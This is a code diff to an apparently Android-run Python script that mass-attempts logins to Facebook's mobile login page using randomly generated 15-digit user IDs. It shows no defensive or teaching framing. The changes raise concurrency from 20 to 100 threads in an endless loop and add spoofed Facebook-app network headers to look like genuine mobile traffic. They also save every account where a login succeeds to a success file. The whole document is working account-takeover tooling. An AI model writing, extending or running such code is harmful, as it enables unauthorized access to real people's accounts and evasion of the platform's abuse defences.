@@ -4,8 +4,9 @@ from bs4 import BeautifulSoup
 from concurrent.futures import ThreadPoolExecutor, as_completed
 import threading
 
-# Thread-safe print
+# Thread-safe print and file write
 print_lock = threading.Lock()
+file_lock = threading.Lock()
 
 def generate_15_digit_userid():
     rest = ''.join(random.choices('0123456789', k=11))
@@ -17,13 +18,19 @@ def attempt_login():
         login_url = "https://m.facebook.com/login.php"
         session = requests.Session()
         headers = {
-            'User-Agent': 'Mozilla/5.0 (Linux; Android 8.1.0; CPH1903 Build/O11019; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/70.0.3538.110 Mobile Safari/537.36 [FBAN/EMA;FBLC/en_US;FBAV/444.0.0.0.110;]',
-            "Accept": "text/html,application/xhtml+xml,application/xml",
-            "Accept-Language": "en-US,en;q=0.5",
-            "Accept-Encoding": "gzip, deflate",
+            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+            "Referer": "https://m.facebook.com/reg",
             "Connection": "keep-alive",
-            "Referer": "https://m.facebook.com/",
-            "Content-Type": "application/x-www-form-urlencoded",
+            "X-FB-Connection-Type": "MOBILE.LTE",
+            "X-FB-Connection-Quality": "EXCELLENT",
+            "X-FB-Net-HNI": "51502",
+            "X-FB-SIM-HNI": "51502",
+            "X-FB-HTTP-Engine": "Liger",
+            'x-fb-connection-type': 'Unknown',
+            'accept-encoding': 'gzip, deflate',
+            'content-type': 'application/x-www-form-urlencoded',
+            'x-fb-http-engine': 'Liger',
+            'User-Agent': 'Mozilla/5.0 (Linux; Android 8.1.0; CPH1903 Build/O11019; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/70.0.3538.110 Mobile Safari/537.36 [FBAN/EMA;FBLC/en_US;FBAV/444.0.0.0.110;]',
         }
         response = session.get(login_url, headers=headers)
         soup = BeautifulSoup(response.text, "html.parser")
@@ -41,6 +48,9 @@ def attempt_login():
         if "c_user" in cookies:
             with print_lock:
                 print(f"✅ Login successful! User ID: {cookies.get('c_user')} ({username})")
+            with file_lock:
+                with open("/storage/emulated/0/success.txt", "a") as file:
+                    file.write(f"{cookies.get('c_user')}:{username}\n")
         else:
             with print_lock:
                 print(f"❌ Login failed for {username}")
@@ -48,9 +58,8 @@ def attempt_login():
         with print_lock:
             print(f"⚠️ Error for attempt: {e}")
 
-# Main loop
 if __name__ == "__main__":
-    max_workers = 20  # Adjust as needed
+    max_workers = 100  # Adjust as needed
     while True:
         with ThreadPoolExecutor(max_workers=max_workers) as executor:
             futures = [executor.submit(attempt_login) for _ in range(max_workers)]
